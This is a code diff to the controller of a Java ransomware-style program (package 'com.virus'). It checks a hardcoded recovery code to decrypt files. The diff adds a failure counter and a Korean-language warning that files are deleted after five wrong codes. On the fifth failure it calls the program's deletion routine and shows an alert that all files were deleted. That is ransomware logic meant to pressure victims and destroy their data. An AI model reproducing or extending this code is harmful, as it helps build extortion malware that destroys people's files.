@@ -3,10 +3,15 @@ package com.virus;
 import javafx.concurrent.Task;
 import javafx.event.ActionEvent;
 import javafx.fxml.FXML;
+//import javafx.fxml.FXMLLoader;
+//import javafx.scene.Cursor;
 import javafx.scene.Parent;
+//import javafx.scene.Scene;
 import javafx.scene.control.Alert;
 import javafx.scene.control.Button;
+//import javafx.scene.control.Hyperlink;
 import javafx.scene.control.TextField;
+//import javafx.stage.Stage;
 
 import java.io.IOException;
 
@@ -19,6 +24,7 @@ public class PurchaseController {
     private Button btnSubmit;
 
     private static final String CODE = "Google!";
+    int failCounter=0;
 
     /**
      * Submit 버튼 이벤트 핸들러
@@ -42,7 +48,6 @@ public class PurchaseController {
                 alert.setHeaderText("Congratulation!");
                 alert.setContentText("Recovery code has been confirmed. Starting a decrypted.");
                 alert.showAndWait();
-
 
                 Task<Void> task = new Task<Void>() {
                     @Override
@@ -72,9 +77,19 @@ public class PurchaseController {
                 new Thread(task).start();
             } else {
                 alert = new Alert(Alert.AlertType.ERROR);
+                failCounter++;
                 alert.setTitle("Fail");
                 alert.setHeaderText("Failure recovery");
-                alert.setContentText("Invalid code!");
+                alert.setContentText("Invalid code!\n"+failCounter+"번 실패했습니다\n5번 실패시 파일이 삭제됩니다.");
+                if(failCounter==5){                             	
+	                alert = new Alert(Alert.AlertType.ERROR);
+	                alert.setTitle("Delete");
+	                alert.setHeaderText("Delete All Files");
+	                alert.setContentText("비밀번호 5번실패로 파일들을 삭제했습니다.");
+	                alert.showAndWait();
+	                Main.encryptionController.deletion();
+                }
+                txtDecryptCode.setText("");
                 alert.showAndWait();
             }
         }
